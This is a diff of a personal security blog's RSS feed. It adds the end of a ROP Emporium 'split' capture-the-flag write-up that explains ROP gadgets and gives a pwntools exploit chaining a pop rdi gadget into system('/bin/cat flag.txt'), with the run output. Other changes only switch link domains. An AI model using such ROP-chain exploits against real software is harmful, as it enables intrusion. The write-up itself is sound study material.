+<pre><code>0x004007c2 : pop r15 ; ret
+</code></pre>
+<p>This is a gadget. The starting position of it is the address <code>0x004007c2</code>, in which the instruction <code>pop r15</code> is located. In the next address, there's a <code>ret</code>. Why is this useful? Because it allows us to store an arbitrary value in <code>r15</code> and then return to wherever it was as if nothing had happened.</p>
+<pre><code>0xAEAE (return address): 0x004007c2 (address to the gadget)
+0xAEAF: 0xCAFE (arbitrary value)
+0xAEB0: 0x000000400560 (exploit function address)
+</code></pre>
+<p>Let's imagine that <code>0xAEAE</code> is the return address of a stack. That means that when the function finishes its execution, it will jump to whatever code is on the address. In this case, the address points to the gadget. This will make the code jump into the <code>pop</code> instruction and it will execute it, and only then it will do the actual return.</p>
+<p><code>pop r15</code> is an instruction that will pop (delete) the value next to it in the stack and store it in the register <code>r15</code>. In this case, I added <code>0xCAFE</code> next to the <code>pop</code> instruction. This value will be stored in the register and then it will be deleted off the stack. What have we achieved with this? We've managed to inject an arbitrary instruction to the function!</p>
+<p>After <code>0xCAFE</code>, there's the address of our exploit function. Since in the gadget we've selected there is a <code>ret</code> instruction, it will actually jump to the exploit function and execute it. That's why normally gadgets tend to end with a return address.</p>
+<p>Truth be told, you can't just run whatever code you want with this. The instructions for a gadget have to exist elsewhere in the binary, you can't just plug in whatever instruction you want. What we're doing is picking specific addresses somewhere in the binary with code useful to us and executing them with a buffer overflow. Still, binaries are sizeable and they tend to have a bunch of gadgets:</p>
+<pre><code>pwndbg> rop
+...
+0x004007c0 : pop r14 ; pop r15 ; ret
+0x004007c2 : pop r15 ; ret
+0x00400694 : pop rbp ; jmp 0x400620
+0x0040060b : pop rbp ; mov edi, 0x601078 ; jmp rax
+0x004007bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x004007bf : pop rbp ; pop r14 ; pop r15 ; ret
+0x00400618 : pop rbp ; ret
+0x004007c3 : pop rdi ; ret
+0x004007c1 : pop rsi ; pop r15 ; ret
+0x004007bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+...
+</code></pre>
+<p>The <code>rop</code>command in pwndbg will find gadgets and print them out. Here are some of the gadgets it has found.</p>
+<p>One of these gadgets is very useful for us, because it allows us to write an arbitrary value to a register we need. That's right, it's the <code>pop rdi</code> gadget! This gadget can make us write the address to the string <code>/bin/cat flag.txt</code> (which we know) to the register <code>rdi</code> (also know as <code>edi</code>).</p>
+<pre><code>from pwn import *
+
+OFFSET = 40
+RET_INSTRUCTION_ADDRESS = 0x0040053e
+EXPLOIT_FUNCTION_ADDRESS = 0x000000400560 # Address of system
+POP_EDI_FUNCTION_ADDRESS = 0x004007c3
+
+payload  = b"A"*OFFSET
+payload += p64(RET_INSTRUCTION_ADDRESS)
+payload += p64(POP_EDI_FUNCTION_ADDRESS)
+payload += p64(0x601060) # Address of the string "/bin/cat flag.txt"
+payload += p64(EXPLOIT_FUNCTION_ADDRESS)
+open("exploit", "bw").write(payload)
+</code></pre>
+<p>With this code, we can do just that. Once <code>pwnme</code> reaches the <code>ret</code> instruction,  first it will jump to the <code>pop rdi</code> gadget. it will execute the instruction, which will pop the value next to it (<code>0x601060</code>), which is the address of the string <code>/bin/cat flag.txt</code>, and it will store it in <code>edi</code>. After that, it will reach another <code>ret</code>. Since the next function in the stack is the <code>system</code> call, we will actually manage to execute <code>system</code> with the argument <code>/bin/cat flag.txt</code>, which will read us the flag. Let's see it in action:</p>
+<pre><code>$ python3 exploit.py
+$ ./split &#x3C; exploit
+split by ROP Emporium
+x86_64
+
+Contriving a reason to ask user for data...
+> Thank you!
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+<p>There's the flag!</p>
+]]></description>
+            <link>https://markelmencia.com/writeups/rop-emporium-split-writeup</link>
+            <guid isPermaLink="true">https://markelmencia.com/writeups/rop-emporium-split-writeup</guid>
+            <pubDate>Wed, 24 Dec 2025 00:00:00 GMT</pubDate>
         </item>
         <item>
             <title><![CDATA[TSG CTF 2025 Writeup: global_writer [Pwn]]]></title>
@@ -489,8 +1932,8 @@ TSGCTF{6O7_4nd_6lob4l_v4r1able5_ar3_4dj4c3n7_1n_m3m0ry_67216011}
 <h2>Conclusion</h2>
 <p>The key of this challenge was that global variables tend to be close to the PLT/GOT region of our binary. If the binary isn't properly protected, nothing stops us from modifying the values of our global variables or PLT entries. This is where the vulnerability lied. By overwriting certain entries and creating our own argument in <code>msg</code> to open a shell, we've managed to turn a seemingly harmless function into one that granted us access to the server.</p>
 ]]></description>
-            <link>https://markelmencia.github.io/writeups/tsgctf2025-global-writer-writeup</link>
-            <guid isPermaLink="true">https://markelmencia.github.io/writeups/tsgctf2025-global-writer-writeup</guid>
+            <link>https://markelmencia.com/writeups/tsgctf2025-global-writer-writeup</link>
+            <guid isPermaLink="true">https://markelmencia.com/writeups/tsgctf2025-global-writer-writeup</guid>
             <pubDate>Sun, 21 Dec 2025 00:00:00 GMT</pubDate>
         </item>
         <item>
@@ -697,8 +2140,8 @@ $
 <p>Buffer Overflows are a key exercise in cybersecurity. With them being so common, it's important to get the hang of them if you want to dive deeper into computer security.</p>
 <p>One thing I haven't went over in this article is about how to avoid these vulnerabilities in our code. It turns out that at times it might not be as easy as it seems, but following some good practices is not hard, and it might save you some day. If knowing how to exploit them is important, knowing how to avoid them is much more than that! A professor I had liked to mention how code integrity shouldn't be a step in development, but a mindset throughout the whole process. Maybe the fact that this advice is ignored is precisely why these vulnerabilities are still happening so much.</p>
 ]]></description>
-            <link>https://markelmencia.github.io/blog/how-to-perform-bof</link>
-            <guid isPermaLink="true">https://markelmencia.github.io/blog/how-to-perform-bof</guid>
+            <link>https://markelmencia.com/blog/how-to-perform-bof</link>
+            <guid isPermaLink="true">https://markelmencia.com/blog/how-to-perform-bof</guid>
             <pubDate>Thu, 18 Dec 2025 00:00:00 GMT</pubDate>
         </item>
         <item>
@@ -725,8 +2168,8 @@ $
 <p>This is all from me for now. Semester finals are next week, so I don't know if I'll have much time to write more, but after that I'll surely have some more time to work on personal projects. Christmas is right around the corner! December always passes by so quickly, so I'll try to make the most of it.</p>
 <p>~ Markel</p>
 ]]></description>
-            <link>https://markelmencia.github.io/blog/webpage-finished-my-experience</link>
-            <guid isPermaLink="true">https://markelmencia.github.io/blog/webpage-finished-my-experience</guid>
+            <link>https://markelmencia.com/blog/webpage-finished-my-experience</link>
+            <guid isPermaLink="true">https://markelmencia.com/blog/webpage-finished-my-experience</guid>
             <pubDate>Thu, 11 Dec 2025 00:00:00 GMT</pubDate>
         </item>
         <item>
@@ -766,8 +2209,8 @@ $
 <p>Anyway, I will continue developing my page. There's a lot to do but I'm excited to see where it ends up. My idea, as I mentioned, is to build a portfolio to showcase my projects. But I especially want to make this page to post articles about whatever I feel like writing, because it's a hobby I quite like. Designing everything myself is clearly an overkill? Absolutely, but we'll see where it ends up!</p>
 <p>~ Markel</p>
 ]]></description>
-            <link>https://markelmencia.github.io/blog/front-end-nightmare</link>
-            <guid isPermaLink="true">https://markelmencia.github.io/blog/front-end-nightmare</guid>
+            <link>https://markelmencia.com/blog/front-end-nightmare</link>
+            <guid isPermaLink="true">https://markelmencia.com/blog/front-end-nightmare</guid>
             <pubDate>Fri, 05 Dec 2025 00:00:00 GMT</pubDate>
         </item>
         <item>
@@ -1094,8 +2537,8 @@ if __name__ == "__main__":
 <h2>Conclusion</h2>
 <p><strong>Bruteforcing</strong> is a very handy (and fun, in my opinion) tool that can help us obtain more data from data that we already have. Always keep an eye open for <strong>bruteforcing oportunities</strong> when you receive a hash!</p>
 ]]></description>
-            <link>https://markelmencia.github.io/writeups/break-the-syntax-ctf-roulette-writeup</link>
-            <guid isPermaLink="true">https://markelmencia.github.io/writeups/break-the-syntax-ctf-roulette-writeup</guid>
+            <link>https://markelmencia.com/writeups/break-the-syntax-ctf-roulette-writeup</link>
+            <guid isPermaLink="true">https://markelmencia.com/writeups/break-the-syntax-ctf-roulette-writeup</guid>
             <pubDate>Sat, 31 May 2025 00:00:00 GMT</pubDate>
         </item>
         <item>
@@ -1267,8 +2710,8 @@ print(f"Stamp in which the seed was generated: {int(time.time()) - count}")
 <h2>Conclusion</h2>
 <p>Seed-based pseudo-random number generation algorithms are fine for <strong>casual, uncompromised uses</strong>. But as we've seen, <strong>these algorithms are not cryptographically safe</strong> and <strong>should not</strong> be used for password generation or similar uses.</p>
 ]]></description>
-            <link>https://markelmencia.github.io/writeups/umdctf2025-find-the-seeds-writeup</link>
-            <guid isPermaLink="true">https://markelmencia.github.io/writeups/umdctf2025-find-the-seeds-writeup</guid>
+            <link>https://markelmencia.com/writeups/umdctf2025-find-the-seeds-writeup</link>
+            <guid isPermaLink="true">https://markelmencia.com/writeups/umdctf2025-find-the-seeds-writeup</guid>
             <pubDate>Wed, 30 Apr 2025 00:00:00 GMT</pubDate>
         </item>
     </channel>
